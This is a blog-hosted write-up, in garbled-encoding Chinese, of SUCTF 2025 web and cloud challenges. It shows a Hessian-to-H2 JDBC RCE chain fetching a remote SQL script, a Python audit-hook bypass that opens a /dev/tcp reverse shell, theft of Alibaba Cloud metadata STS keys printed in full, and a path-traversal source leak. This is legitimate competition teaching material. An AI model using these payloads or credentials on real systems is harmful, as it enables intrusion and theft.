
<!DOCTYPE html>
<html lang="en-us">
<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
    <title>2025-SUCTF-WP | GSBP&#39;s Blog</title>
    <meta name="description"
        content="2025å¹´çš„ç¬¬ä¸€åœºXCTF">
    <link rel="canonical" href="http://localhost:1313/post/2025suctf/" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bulma/0.7.4/css/bulma.min.css">
    
    <link rel="stylesheet" href="http://localhost:1313/scss/style.min.badf012c7f163854e3d9c3287a1df0863ae1974f62e123bbf1f2948b58ed39cf.css">

    <meta property="og:url" content="http://localhost:1313/post/2025suctf/">
  <meta property="og:site_name" content="GSBP&#39;s Blog">
  <meta property="og:title" content="2025-SUCTF-WP">
  <meta property="og:description" content="2025å¹´çš„ç¬¬ä¸€åœºXCTF">
  <meta property="og:locale" content="en_us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="post">
    <meta property="article:published_time" content="2025-01-18T19:38:41+08:00">
    <meta property="article:modified_time" content="2025-01-18T19:38:41+08:00">

    
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="2025-SUCTF-WP">
  <meta name="twitter:description" content="2025å¹´çš„ç¬¬ä¸€åœºXCTF">

    

</head>
<body><nav class="navbar is-light" role="navigation">
    <div class="container">
        <div class="navbar-brand">
            <a href="/" title="home" class="navbar-item">
                <span class="logo">
                    <h1>GSBP&#39;s Blog</h1>
                </span>
            </a>

            
            <a id="theme-toggle" class="theme-toggle" href="#">
                <img src="http://localhost:1313/svg/sun.svg" alt="sun icon" class="theme-icon" />
            </a>

            <a role="button" class="navbar-burger" aria-label="menu" aria-expanded="false">
                <span aria-hidden="true"></span>
                <span aria-hidden="true"></span>
                <span aria-hidden="true"></span>
            </a>
        </div>

        <div class="navbar-menu">
            <div class="navbar-start">
                
                <a href="/about" class="navbar-item">About</a>
                
                <a href="/post" class="navbar-item">Blog</a>
                
                <a href="/categories" class="navbar-item">Categories</a>
                
                <a href="/friend" class="navbar-item">Friends</a>
                
            </div>

        </div>
        <div class="search">
            <div id="fastSearch">
                <input id="searchInput" tabindex="0" placeholder="Search..">
                <ul id="searchResults">

                </ul>
            </div>
            <a id="search-btn" style="display: inline-block;" href="# ">
                <div class="icon-search"><svg class="search-svg" xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg></div>
            </a>
        </div>

        <script src="/js/fuse.min.js"></script> 
        <script src="/js/fastsearch.js"></script>

    </div>
</nav>

<script>
    
    document.addEventListener('DOMContentLoaded', function() {
        var burger = document.querySelector('.navbar-burger');
        burger.addEventListener('click', function() {
            burger.classList.toggle('is-active');
            document.querySelector('.navbar-menu').classList.toggle('is-active');
        });
    });

    
    function setTheme(theme) {
        let body = document.body;
        let themeIcon = document.querySelector(".theme-icon");
        if (theme === "dark") {
            body.classList.add("dark-mode");
            themeIcon.src = "http:\/\/localhost:1313\/svg/moon.svg";
            themeIcon.alt = "moon icon";
        } else {
            body.classList.remove("dark-mode");
            themeIcon.src = "http:\/\/localhost:1313\/svg/sun.svg";
            themeIcon.alt = "sun icon";
        }
        
        localStorage.setItem("theme", theme);
    }

    
    let theme = localStorage.getItem("theme") || "light";
    const isDarkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
    if (isDarkMode) {
        
        setTheme('dark');

    } else {
        
        setTheme('light');
    }
    setTheme(theme);

    
    document.getElementById("theme-toggle").addEventListener("click", function() {
        if (theme === "light") {
            theme = "dark";
        } else {
            theme = "light";
        }
        setTheme(theme);
    });



</script>

</header><main>
<div class="single-container">
    <div class="archive">
        <h1 class="title is-1">2025-SUCTF-WP</h1>
        <div class="title subtitle heading is-6">
            <div class="author-info columns is-vcentered">
                <div class="column">
                    <div class="columns is-vcentered is-mobile">
                        
                        <div class="column is-narrow">
                            <img src="/img/GSBP.jpg" class="author-image">
                        </div>
                        
                        <div class="column">
                            <p>GSBP</p>
                            <p><time>January 18, 2025</time>
                            </p>
                        </div>
                    </div>
                </div>
                <div class="small-categories-container">
                    <a href="/categories/wp">WP</a>
                </div>
            </div>
        </div>
        <div class="content article-content">
            <div class="toc-container">
                
    <div class="post-toc">
        
            <aside>
                <button id="tocButton" ><h4 id="contents" style="margin-left: 1vw;color:rgb(96, 134, 180);margin-bottom: 0;">CONTENTS</h4></button>
                <div id="hide"><nav id="TableOfContents">
  <ul>
    <li><a href="#su_ez_solon">SU_ez_solon</a>
      <ul>
        <li><a href="#åšé¢˜è¿‡ç¨‹">åšé¢˜è¿‡ç¨‹</a></li>
      </ul>
    </li>
    <li><a href="#su_easyk8s_on_aliyunreally-very-easy">SU_easyk8s_on_aliyun(REALLY VERY EASY)</a></li>
    <li><a href="#su_blog">SU_blog</a></li>
    <li><a href="#su_photogallery">SU_photogallery</a></li>
  </ul>
</nav></div>
            </aside>
        
    </div><script>
    
        let button = document.getElementById('tocButton');
        let hide = document.getElementById("hide");
        let contents=document.getElementById("contents");
        button.addEventListener("click", function() {
        if (hide.style.display!='block') {
            hide.style.display='block'
        } else {
            hide.style.display='none'
            contents.style.color='rgb(96, 134, 180)'
        }
        });
    




</script>
            </div>
            <h2 id="su_ez_solon">SU_ez_solon</h2>
<p>é¢˜ç›®ç›´æ¥ç»™äº†ä¸ªhessianååºåˆ—åŒ–çš„æ¥å£</p>
<pre tabindex="0"><code>//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package com.example.demo.controller;

import com.caucho.hessian.io.Hessian2Input;
import java.io.ByteArrayInputStream;
import java.util.Base64;
import org.noear.solon.annotation.Controller;
import org.noear.solon.annotation.Mapping;
import org.noear.solon.annotation.Param;

@Controller
public class IndexController {
    public IndexController() {
    }

    @Mapping(&#34;/hello&#34;)
    public String hello(@Param(defaultValue = &#34;hello&#34;) String data) throws Exception {
        byte[] decode = Base64.getDecoder().decode(data);
        Hessian2Input hessian2Input = new Hessian2Input(new ByteArrayInputStream(decode));
        Object object = hessian2Input.readObject();
        return object.toString();
    }
}
</code></pre><p>ä¸è¿‡ä»–è¿™ä¸ªååºåˆ—åŒ–è¿˜ç»™äº†ä¸€ä¸ªtoString()çš„è°ƒç”¨</p>
<p>ç„¶åå†è§‚å¯Ÿä¸€ä¸‹ç»™çš„ä¾èµ–</p>
<pre tabindex="0"><code>...
 &lt;dependency&gt;
            &lt;groupId&gt;com.alipay.sofa&lt;/groupId&gt;
            &lt;artifactId&gt;hessian&lt;/artifactId&gt;
            &lt;version&gt;3.5.5&lt;/version&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;com.alipay.sofa.common&lt;/groupId&gt;
            &lt;artifactId&gt;sofa-common-tools&lt;/artifactId&gt;
            &lt;version&gt;1.4.0&lt;/version&gt;
        &lt;/dependency&gt;


        &lt;dependency&gt;
            &lt;groupId&gt;com.alibaba&lt;/groupId&gt;
            &lt;artifactId&gt;fastjson&lt;/artifactId&gt;
            &lt;version&gt;1.2.83&lt;/version&gt;
        &lt;/dependency&gt;

        &lt;dependency&gt;
            &lt;groupId&gt;com.h2database&lt;/groupId&gt;
            &lt;artifactId&gt;h2&lt;/artifactId&gt;
            &lt;version&gt;2.2.224&lt;/version&gt;
        &lt;/dependency&gt;
</code></pre><p>h2å’Œfastjsonè¿™ä¿©ä¾èµ–å†™ä¸€èµ·çš„ï¼Œå†åŠ ä¸Šä¸Šé¢çš„toString(),æŒ‡å‘å‹å¾ˆå¼ºäº†,å°±æ˜¯è®©æˆ‘ä»¬åˆ©ç”¨fastjsonçš„getteræ‰“ä¸€ä¸ªJDBCæ”»å‡»</p>
<h3 id="åšé¢˜è¿‡ç¨‹">åšé¢˜è¿‡ç¨‹</h3>
<p>åšé¢˜çš„æ—¶å€™æ‰¾äº†æœ‰å‡ ä¸ªèƒ½æ‰“é€šçš„ç±»ï¼Œä½†éƒ½å› ä¸ºsofa-hessianè‡ªå¸¦çš„ååºåˆ—åŒ–åå•è¢«åšæ‰äº†</p>
<p>æˆ‘ä»¬éœ€è¦çŸ¥é“åœ¨æ‰“h2çš„jdbcæ—¶ï¼Œæœ€åéƒ½ä¼šèµ°å‘å“ªä¸ªç±»çš„å“ªä¸ªæ–¹æ³•</p>
<p><code>org.h2.jdbc.JdbcConnection.JdbcConnection()</code></p>
<p>å°±æ˜¯JdbcConnectionçš„æ„é€ æ–¹æ³•ï¼Œä»¥æ­¤ä¸ºæ ¹æ®å»æ‰¾å“ªäº›getterä¼šå®ä¾‹åŒ–ä¸€ä¸ªJdbcConnectionç±»</p>
<p>è¿™é‡Œå¯ä»¥å†™codeqlæ¥æ‰¾ï¼Œæˆ‘æœ‰ç‚¹æ‡’æ²¡å’‹å†™ï¼Œè¿™é‡Œå†™æˆ‘æ‰¾åˆ°çš„ä¸¤ä¸ªæ–¹æ³•</p>
<ul>
<li>org.h2.jdbcx.JdbcDataSource.getConnection()</li>
<li>org.noear.solon.data.util.UnpooledDataSource</li>
</ul>
<p>ç¬¬ä¸€ä¸ªè¢«é»‘åå•banäº†ï¼Œä½†æ˜¯å®ƒç»™äº†æˆ‘ä»¬äº›è®¸çµæ„Ÿï¼Œ<code>JdbcDataSource</code>ç±»å®ç°äº†<code>DataSource</code>æ¥å£ï¼Œç»§æ‰¿è¿™ä¸ªæ¥å£çš„ç±»éƒ½è¦é‡å†™getConnection()æ–¹æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å»æ ¹æ®ç»§æ‰¿å…³ç³»æ¥å¯»æ‰¾é€‚åˆçš„æ–¹æ³•</p>
<p>æ‰€ä»¥æˆ‘ä»¬æ‰¾åˆ°äº†<code>UnpooledDataSource</code>æ–¹æ³•ï¼Œå³ä¸åœ¨é»‘åå•ä¸Šï¼Œè€Œä¸”ä»–çš„æ„é€ æ–¹æ³•å’ŒgetConnectionä¹Ÿå¾ˆæœ‰æ„æ€</p>
<pre tabindex="0"><code>public UnpooledDataSource(String url, String username, String password, String driverClassName) {
        if (Utils.isEmpty(url)) {
            throw new IllegalArgumentException(&#34;Invalid ds url parameter&#34;);
        } else {
            this.logWriter = new PrintWriter(System.out);
            this.url = url;
            this.username = username;
            this.password = password;
            this.setDriverClassName(driverClassName);
        }
    }
    
public Connection getConnection() throws SQLException {
        return this.username == null ? DriverManager.getConnection(this.url) : DriverManager.getConnection(this.url, this.username, this.password);
    }
</code></pre><p>æ„é€ æ–¹æ³•ä¼šè‡ªåŠ¨æ ¹æ®ä½ çš„driverClassNameæ¥æ³¨å†Œå¯¹åº”é©±åŠ¨ç±»ï¼Œç„¶ågetConnection()ä¹Ÿä¼šç›´æ¥ä»DriverManagerä¸­è¿›è¡ŒConnectionæ“ä½œï¼Œæ³›ç”¨æ€§å¾ˆå¼º</p>
<p>ç„¶ååé¢å¸¸è§„æ‰“h2RCEçš„æ€è·¯äº†ï¼Œæœ‰ä¸€ä¸ªSecurityManagerè¦ç»•ï¼Œå…¶å®ç›´æ¥è°ƒç”¨<code>setSecurityManager(null)</code>å°±å¥½äº†</p>
<pre tabindex="0"><code>    public static void main(String[] args) throws Exception{
        UnpooledDataSource unpooledDataSource = new UnpooledDataSource(&#34;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#39;http://127.0.0.1:8000/poc.sql&#39;&#34;,&#34;GSBP&#34;,&#34;GSBP&#34;,&#34;org.h2.Driver&#34;);
        unpooledDataSource.setLogWriter(null);
        JSONObject jsonObject = new JSONObject();
        jsonObject.put(&#34;xx&#34;, unpooledDataSource);


        String payload =Util.hessianSerialize(jsonObject);
        System.out.println(URLEncoder.encode(payload, &#34;UTF-8&#34;));
        Util.hessianDeserialize(payload);

    }
</code></pre><p>poc.sql</p>
<pre tabindex="0"><code>  CREATE ALIAS GSBPPP12 AS $$ String shellexec(String cmd) throws java.io.IOException { System.setSecurityManager(null);java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(&#34;\\A&#34;); return s.hasNext() ? s.next() : &#34;&#34;;  }$$;CALL GSBPPP12(&#39;command what you want execute&#39;);
</code></pre><h2 id="su_easyk8s_on_aliyunreally-very-easy">SU_easyk8s_on_aliyun(REALLY VERY EASY)</h2>
<p>ç¡®å®æ˜¯å¾ˆç®€å•çš„ä¸€ä¸ªäº‘æ¸—é€</p>
<p>å‰é¢è¦ä»pythoné‚£é‡Œæ‹¿ä¸ªshellï¼Œä¸è¿‡æœ‰hook</p>
<pre tabindex="0"><code>import sys

DBUG = False

def audit_hook(event, args):
    audit_functions = {
        &#34;os.system&#34;: {&#34;ban&#34;: True},
        &#34;subprocess.Popen&#34;: {&#34;ban&#34;: True},
        &#34;subprocess.run&#34;: {&#34;ban&#34;: True},
        &#34;subprocess.call&#34;: {&#34;ban&#34;: True},
        &#34;subprocess.check_call&#34;: {&#34;ban&#34;: True},
        &#34;subprocess.check_output&#34;: {&#34;ban&#34;: True},
        &#34;_posixsubprocess.fork_exec&#34;: {&#34;ban&#34;: True},
        &#34;os.spawn&#34;: {&#34;ban&#34;: True},
        &#34;os.spawnlp&#34;: {&#34;ban&#34;: True},
        &#34;os.spawnv&#34;: {&#34;ban&#34;: True},
        &#34;os.spawnve&#34;: {&#34;ban&#34;: True},
        &#34;os.exec&#34;: {&#34;ban&#34;: True},
        &#34;os.execve&#34;: {&#34;ban&#34;: True},
        &#34;os.execvp&#34;: {&#34;ban&#34;: True},
        &#34;os.execvpe&#34;: {&#34;ban&#34;: True},
        &#34;os.fork&#34;: {&#34;ban&#34;: True},
        &#34;shutil.run&#34;: {&#34;ban&#34;: True},
        &#34;ctypes.dlsym&#34;: {&#34;ban&#34;: True},
        &#34;ctypes.dlopen&#34;: {&#34;ban&#34;: True}
    }
    if event in audit_functions:
        if DEBUG:
            print(f&#34;[DEBUG] found event {event}&#34;)
        policy = audit_functions[event]
        if policy[&#34;ban&#34;]:
            strr = f&#34;AUDIT BAN : Banning FUNC:[{event}] with ARGS: {args}&#34;
            print(strr)
            raise PermissionError(f&#34;[AUDIT BANNED]{event} is not allowed.&#34;)
        else:
            strr = f&#34;[DEBUG] AUDIT ALLOW : Allowing FUNC:[{event}] with ARGS: {args}&#34;
            print(strr)
            return

sys.addaudithook(audit_hook)
</code></pre><p>è¿™é‡Œ<code>_posixsubprocess.fork_exec</code>è¿™ä¸ªhookæ˜¯æŠ“ä¸äº†çš„ï¼Œæ‰€ä»¥å®ƒç­‰äºç™½å†™</p>
<pre tabindex="0"><code>__import__(&#39;_posixsubprocess&#39;).fork_exec(
    [b&#34;/bin/bash&#34;, b&#34;-c&#34;, b&#34;bash -i &gt;&amp; /dev/tcp/1.1.1.1/6666 0&gt;&amp;1&#34;], 
    [b&#34;/bin/bash&#34;], 
    True, (), None, None, 
    -1, -1, -1, -1, -1, -1, 
    *(__import__(&#39;os&#39;).pipe()), 
    False, False, False, 
    None, None, None, 
    -1, None, False
)
</code></pre><p>ç›´æ¥æ‹¿shellï¼Œç„¶åç”¨ptyå‡çº§ä¸€ä¸‹è‡ªå·±çš„shell</p>
<p>è¿›shellä¹‹åè¦ä¿¡æ¯æœé›†ä¸€ä¸‹ï¼Œè¿™é‡Œå¸¸ç”¨æ€è·¯å°±æ˜¯ç”¨cdk_linux_amd64</p>
<pre tabindex="0"><code>...
[  Information Gathering - Net Namespace  ]
        container net namespace isolated.

[  Information Gathering - Sysctl Variables  ]
2025/01/12 08:57:58 net.ipv4.conf.all.route_localnet = 1
2025/01/12 08:57:58 You may be able to access the localhost service of the current container node or other nodes.

[  Information Gathering - DNS-Based Service Discovery  ]
error when requesting coreDNS: lookup any.any.svc.cluster.local. on 10.43.0.10:53: no such host
error when requesting coreDNS: lookup any.any.any.svc.cluster.local. on 10.43.0.10:53: no such host

[  Discovery - K8s API Server  ]
2025/01/12 08:57:58 checking if api-server allows system:anonymous request.
err found in post request, error response code: 401 Unauthorized.
        api-server forbids anonymous request.
        response:{&#34;kind&#34;:&#34;Status&#34;,&#34;apiVersion&#34;:&#34;v1&#34;,&#34;metadata&#34;:{},&#34;status&#34;:&#34;Failure&#34;,&#34;message&#34;:&#34;Unauthorized&#34;,&#34;reason&#34;:&#34;Unauthorized&#34;,&#34;code&#34;:401}


[  Discovery - K8s Service Account  ]
        service-account is available
2025/01/12 08:57:58 trying to list namespaces
err found in post request, error response code: 403 Forbidden.

[  Discovery - Cloud Provider Metadata API  ]
        Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/
        Docs: https://help.aliyun.com/knowledge_detail/49122.html
2025/01/12 08:57:59 failed to dial Azure API.
2025/01/12 08:57:59 failed to dial Google Cloud API.
2025/01/12 08:57:59 failed to dial Tencent Cloud API.
2025/01/12 08:58:00 failed to dial OpenStack API.
2025/01/12 08:58:01 failed to dial Amazon Web Services (AWS) API.
2025/01/12 08:58:02 failed to dial ucloud API.

...
</code></pre><p>ä¸é¢˜ç›®åå­—ç›¸ç»“åˆï¼ŒçŸ¥é“äº†å…³é”®ä¿¡æ¯</p>
<pre tabindex="0"><code>[  Discovery - Cloud Provider Metadata API  ]
        Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/
        Docs: https://help.aliyun.com/knowledge_detail/49122.html
</code></pre><p>ç„¶åå»çœ‹æ–‡æ¡£</p>
<p>
<div class="post-img-view">
<a data-fancybox="gallery" href="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250119001027524.png">
<img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250119001027524.png" alt="image-20250119001027524"  />
</a>
</div>

</p>
<p>å¾ˆæ˜æ˜¾åœ¨é¢˜ç›®å†…æ˜¯æ²¡æœ‰å¼€åŠ å›ºæ¨¡å¼çš„,æˆ‘ä»¬è¿™é‡Œç›´æ¥è®¿é—®å°±å¥½</p>
<p>ç„¶åæ‹¿åˆ°äº†ä¸€ä¸ªak/sk</p>
<pre tabindex="0"><code> {
  &#34;AccessKeyId&#34; : &#34;STS.NTfZuo3n761cQMys2MNiNBo9a&#34;,
  &#34;AccessKeySecret&#34; : &#34;5zbrTpf6iWzMu6DdPpy42ZCj2kDfrwbte4JT9LLCQBzY&#34;,
  &#34;Expiration&#34; : &#34;2025-01-12T14:05:03Z&#34;,
  &#34;SecurityToken&#34; : &#34;CAIS1AJ1q6Ft5B2yfSjIr5fTEc/b3rEWgfOIU2vIlzIYQuZiraqSgzz2IHhMdHRqBe0ctvQ+lG5W6/4YloltTtpfTEmBc5I179Fd6VqqZNTZqcy74qwHmYS1RXadFEZYDnNszr+rIunGc9KBNnrm9EYqs5aYGBymW1u6S+7r7bdsctUQWCShcDNCH604DwB+qcgcRxCzXLTXRXyMuGfLC1dysQdRkH527b/FoveR8R3Dllb3uIR3zsbTWsH6MZc1Z8wkDovsjbArKvL7vXQOu0QQxsBfl7dZ/DrLhNaZDmRK7g+OW+iuqYU3fFIjOvVgQ/4V/KaiyKUioIzUjJ+y0RFKIfHnm/ES9DUVqiGtOpRKVr5RHd6TUxxGgmVUsD3M+Eqi7Sau0K+e5xjFvkUxaHpiA3iRUcyMsxuRQWyIEOP+y9oVsqEYoRiWu7TDSTeBK6PPRvNGUvdUGoABfmqFersd5q3sAhpi7UHmtkhuEn8jODpY4bxubpPLrQwZu7ToyzoWY9vERJzKarge1l3oM9jQP+q30t86v6WxFy2RHh97iDaIEUh3gpL9Mxu9fi4aRYzPZ2qhdZNCdWlE3CrGCuPAsoU0g3JUohJJnycnBj9o54Tdk4cTkjugEyUgAA==&#34;,
  &#34;LastUpdated&#34; : &#34;2025-01-12T08:05:03Z&#34;,
  &#34;Code&#34; : &#34;Success&#34;
}
</code></pre><p>å¾ˆæ˜æ˜¾å°±æ˜¯è¦æˆ‘ä»¬å»ossğŸª£é‡Œçœ‹flagï¼Œä¸Šå»å‘ç°è¢«åˆ äº†ï¼Œä¸è¿‡æ²¡å¤šå¤§é—®é¢˜ï¼Œè¿™é‡Œæˆ‘ä»¬çœ‹ä¹‹å‰ç‰ˆæœ¬çš„å†…å®¹å°±å¥½äº†</p>
<p>
<div class="post-img-view">
<a data-fancybox="gallery" href="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250119001224588.png">
<img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250119001224588.png" alt="image-20250119001224588"  />
</a>
</div>

</p>
<h2 id="su_blog">SU_blog</h2>
<p>æ³¨å†Œæ¥å£æœ‰ä¸ªä»»æ„ç”¨æˆ·å¯†ç é‡ç½®çš„æ´ï¼Œè¿™é‡Œç›´æ¥ç”¨adminåšç”¨æˆ·åå°±èƒ½é‡ç½®adminçš„å¯†ç äº†</p>
<p>ä¹Ÿçœäº†åé¢çˆ†ç ´jwtå¯†é’¥çš„æ“ä½œ</p>
<p>çœ‹åˆ°articleé‡Œçš„ä¼ å‚ï¼Œå¾ˆæ˜æ˜¾çš„æ–‡ä»¶è·¯å¾„ï¼Œè¿™é‡Œå°è¯•ä¸€ä¸‹èƒ½ä¸èƒ½è·¯å¾„ç©¿è¶Š</p>
<p>
<div class="post-img-view">
<a data-fancybox="gallery" href="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250119001454706.png">
<img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250119001454706.png" alt="image-20250119001454706"  />
</a>
</div>

</p>
<p>å‘ç°åŠ <code>../</code>å’Œä¸åŠ æ˜¯ä¸€æ ·çš„ï¼ŒçŒœæµ‹åç«¯è¿›è¡Œäº†replaceæ“ä½œ</p>
<p>æ‰€ä»¥è¯•ä¸€ä¸‹åŒå†™<code>..../</code>ï¼Œç„¶åå°±èƒ½è¯»äº†</p>
<p>è¯»åˆ°æºç å’Œwaf(wafæˆ‘è¿™é‡Œç”¨waf&hellip;/pyæ¥ç»•è¿‡è¯»åˆ°)</p>
<pre tabindex="0"><code>from flask import *
import time, os, json, hashlib
from pydash import set_
from waf import pwaf, cwaf

app = Flask(__name__)
app.config[&#39;SECRET_KEY&#39;] = hashlib.md5(str(int(time.time())).encode()).hexdigest()

users = {&#34;testuser&#34;: &#34;password&#34;}
BASE_DIR = &#39;/var/www/html/myblog/app&#39;
articles = {
    1: &#34;articles/article1.txt&#34;,
    2: &#34;articles/article2.txt&#34;,
    3: &#34;articles/article3.txt&#34;
}
friend_links = [
    {&#34;name&#34;: &#34;bkf1sh&#34;, &#34;url&#34;: &#34;https://ctf.org.cn/&#34;},
    {&#34;name&#34;: &#34;fushuling&#34;, &#34;url&#34;: &#34;https://fushuling.com/&#34;},
    {&#34;name&#34;: &#34;yulate&#34;, &#34;url&#34;: &#34;https://www.yulate.com/&#34;},
    {&#34;name&#34;: &#34;zimablue&#34;, &#34;url&#34;: &#34;https://www.zimablue.life/&#34;},
    {&#34;name&#34;: &#34;baozongwi&#34;, &#34;url&#34;: &#34;https://baozongwi.xyz/&#34;}
]

class User:
    def __init__(self):
        pass

user_data = User()

@app.route(&#39;/&#39;)
def index():
    if &#39;username&#39; in session:
        return render_template(&#39;blog.html&#39;, articles=articles, friend_links=friend_links)
    return redirect(url_for(&#39;login&#39;))

@app.route(&#39;/login&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])
def login():
    if request.method == &#39;POST&#39;:
        username = request.form[&#39;username&#39;]
        password = request.form[&#39;password&#39;]
        if username in users and users[username] == password:
            session[&#39;username&#39;] = username
            return redirect(url_for(&#39;index&#39;))
        else:
            return &#34;Invalid credentials&#34;, 403
    return render_template(&#39;login.html&#39;)

@app.route(&#39;/register&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])
def register():
    if request.method == &#39;POST&#39;:
        username = request.form[&#39;username&#39;]
        password = request.form[&#39;password&#39;]
        users[username] = password
        return redirect(url_for(&#39;login&#39;))
    return render_template(&#39;register.html&#39;)

@app.route(&#39;/change_password&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])
def change_password():
    if &#39;username&#39; not in session:
        return redirect(url_for(&#39;login&#39;))
    if request.method == &#39;POST&#39;:
        old_password = request.form[&#39;old_password&#39;]
        new_password = request.form[&#39;new_password&#39;]
        confirm_password = request.form[&#39;confirm_password&#39;]
        
        if users[session[&#39;username&#39;]] != old_password:
            flash(&#34;Old password is incorrect&#34;, &#34;error&#34;)
        elif new_password != confirm_password:
            flash(&#34;New passwords do not match&#34;, &#34;error&#34;)
        else:
            users[session[&#39;username&#39;]] = new_password
            flash(&#34;Password changed successfully&#34;, &#34;success&#34;)
        return redirect(url_for(&#39;index&#39;))
    return render_template(&#39;change_password.html&#39;)

@app.route(&#39;/friendlinks&#39;)
def friendlinks():
    if &#39;username&#39; not in session or session[&#39;username&#39;] != &#39;admin&#39;:
        return redirect(url_for(&#39;login&#39;))
    return render_template(&#39;friendlinks.html&#39;, links=friend_links)

@app.route(&#39;/add_friendlink&#39;, methods=[&#39;POST&#39;])
def add_friendlink():
    if &#39;username&#39; not in session or session[&#39;username&#39;] != &#39;admin&#39;:
        return redirect(url_for(&#39;login&#39;))
    
    name = request.form.get(&#39;name&#39;)
    url = request.form.get(&#39;url&#39;)
    if name and url:
        friend_links.append({&#34;name&#34;: name, &#34;url&#34;: url})
    return redirect(url_for(&#39;friendlinks&#39;))

@app.route(&#39;/delete_friendlink/&#39;)
def delete_friendlink(index):
    if &#39;username&#39; not in session or session[&#39;username&#39;] != &#39;admin&#39;:
        return redirect(url_for(&#39;login&#39;))
    
    if 0 &lt;= index &lt; len(friend_links):
        del friend_links[index]
    return redirect(url_for(&#39;friendlinks&#39;))

@app.route(&#39;/article&#39;)
def article():
    if &#39;username&#39; not in session:
        return redirect(url_for(&#39;login&#39;))
    
    file_name = request.args.get(&#39;file&#39;, &#39;&#39;)
    if not file_name:
        return render_template(&#39;article.html&#39;, file_name=&#39;&#39;, content=&#34;æœªæä¾›æ–‡ä»¶åã€‚&#34;)
    
    blacklist = [&#34;waf.py&#34;]
    if any(blacklisted_file in file_name for blacklisted_file in blacklist):
        return render_template(&#39;article.html&#39;, file_name=file_name, content=&#34;å¤§é»‘é˜”ä¸è®¸çœ‹&#34;)
    
    if not file_name.startswith(&#39;articles/&#39;):
        return render_template(&#39;article.html&#39;, file_name=file_name, content=&#34;æ— æ•ˆçš„æ–‡ä»¶è·¯å¾„ã€‚&#34;)
    
    if file_name not in articles.values():
        if session.get(&#39;username&#39;) != &#39;admin&#39;:
            return render_template(&#39;article.html&#39;, file_name=file_name, content=&#34;æ— æƒè®¿é—®è¯¥æ–‡ä»¶ã€‚&#34;)
    
    file_path = os.path.join(BASE_DIR, file_name)
    file_path = file_path.replace(&#39;../&#39;, &#39;&#39;)
    
    try:
        with open(file_path, &#39;r&#39;, encoding=&#39;utf-8&#39;) as f:
            content = f.read()
    except FileNotFoundError:
        content = &#34;æ–‡ä»¶æœªæ‰¾åˆ°ã€‚&#34;
    except Exception as e:
        app.logger.error(f&#34;Error reading file {file_path}: {e}&#34;)
        content = &#34;è¯»å–æ–‡ä»¶æ—¶å‘ç”Ÿé”™è¯¯ã€‚&#34;
    
    return render_template(&#39;article.html&#39;, file_name=file_name, content=content)

@app.route(&#39;/Admin&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])
def admin():
    if request.args.get(&#39;pass&#39;) != &#34;SUers&#34;:
        return &#34;nonono&#34;
    
    if request.method == &#39;POST&#39;:
        try:
            body = request.json
            if not body:
                flash(&#34;No JSON data received&#34;, &#34;error&#34;)
                return jsonify({&#34;message&#34;: &#34;No JSON data received&#34;}), 400
            
            key = body.get(&#39;key&#39;)
            value = body.get(&#39;value&#39;)
            
            if key is None or value is None:
                flash(&#34;Missing required keys: &#39;key&#39; or &#39;value&#39;&#34;, &#34;error&#34;)
                return jsonify({&#34;message&#34;: &#34;Missing required keys: &#39;key&#39; or &#39;value&#39;&#34;}), 400
            
            if not pwaf(key):
                flash(&#34;Invalid key format&#34;, &#34;error&#34;)
                return jsonify({&#34;message&#34;: &#34;Invalid key format&#34;}), 400
            
            if not cwaf(value):
                flash(&#34;Invalid value format&#34;, &#34;error&#34;)
                return jsonify({&#34;message&#34;: &#34;Invalid value format&#34;}), 400
            
            set_(user_data, key, value)
            flash(&#34;User data updated successfully&#34;, &#34;success&#34;)
            return jsonify({&#34;message&#34;: &#34;User data updated successfully&#34;}), 200
        
        except json.JSONDecodeError:
            flash(&#34;Invalid JSON data&#34;, &#34;error&#34;)
            return jsonify({&#34;message&#34;: &#34;Invalid JSON data&#34;}), 400
        except Exception as e:
            flash(f&#34;An error occurred: {str(e)}&#34;, &#34;error&#34;)
            return jsonify({&#34;message&#34;: f&#34;An error occurred: {str(e)}&#34;}), 500
    
    return render_template(&#39;admin.html&#39;, user_data=user_data)

@app.route(&#39;/logout&#39;)
def logout():
    session.pop(&#39;username&#39;, None)
    flash(&#34;You have been logged out.&#34;, &#34;info&#34;)
    return redirect(url_for(&#39;login&#39;))

if __name__ == &#39;__main__&#39;:
    app.run(host=&#39;0.0.0.0&#39;, port=10000)
</code></pre><p>é™¤äº†ä¹‹å‰ç”¨åˆ°çš„æ¥å£ï¼Œåªå‰©ä¸‹ä¸€ä¸ª<code>/Admin</code></p>
